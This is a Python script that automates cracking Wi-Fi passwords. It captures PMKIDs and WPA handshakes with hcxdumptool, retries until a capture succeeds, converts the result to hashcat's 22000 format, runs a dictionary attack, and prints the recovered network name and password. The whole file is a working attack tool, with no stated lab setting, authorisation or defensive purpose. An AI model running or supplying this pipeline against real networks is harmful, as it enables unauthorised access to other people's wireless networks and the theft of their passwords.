import subprocess
import time
import os
from datetime import datetime

def run_command(command, timeout=None):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "[!] Command timed out."

def capture_handshake(channel, duration):
    print(f"[*] Capturing on channel {channel} for {duration} seconds...")
    capture_cmd = f"sudo hcxdumptool -i wlan0 -w pmkid.pcapng -c {channel} --attemptapmax=10"
    proc = subprocess.Popen(capture_cmd, shell=True)
    time.sleep(duration)
    proc.terminate()
    time.sleep(2)

def analyze_pcapng():
    print("[*] Analyzing capture file...")
    result = run_command("hcxpcapngtool -o pmkid.16800 pmkid.pcapng > summary.txt && cat summary.txt")
    return result

def extract_to_22000():
    print("[*] Converting to Hashcat format (22000)...")
    run_command("hcxpcapngtool -o wpa.22000 pmkid.pcapng")

def run_hashcat(wordlist):
    print("[*] Running Hashcat cracking process...")
    run_command(f"hashcat -m 22000 wpa.22000 {wordlist} --force -o cracked.txt")

def parse_cracked_output():
    if not os.path.exists("cracked.txt"):
        return None
    with open("cracked.txt", "r") as file:
        for line in file:
            parts = line.strip().split(":")
            if len(parts) >= 5:
                return {
                    "ssid": parts[3],
                    "password": parts[4],
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
    return None

def main():
    channel = input("Enter Wi-Fi channel (e.g., 1a, 6a, 11a): ").strip()
    wordlist = input("Enter path to wordlist file: ").strip()
    try:
        duration = int(input("Enter capture duration in seconds (e.g., 60, 120): ").strip())
    except ValueError:
        print("[!] Invalid duration. Using default: 120 seconds.")
        duration = 120

    while True:
        capture_handshake(channel, duration)
        summary = analyze_pcapng()

        if "written to hash files" in summary or "EAPOL pairs written to 22000 hash file" in summary:
            print("[+] Valid PMKID or handshake found.")
            break
        else:
            print("[-] No PMKID or handshake found. Retrying...\n")

    extract_to_22000()
    run_hashcat(wordlist)

    result = parse_cracked_output()
    if result:
        print("\n✅ Success!")
        print("-----------------------------")
        print(f"SSID:     {result['ssid']}")
        print(f"Password: {result['password']}")
        print(f"Time:     {result['timestamp']}")
        print("-----------------------------")
    else:
        print("[-] No password cracked.")

if __name__ == "__main__":
    main()
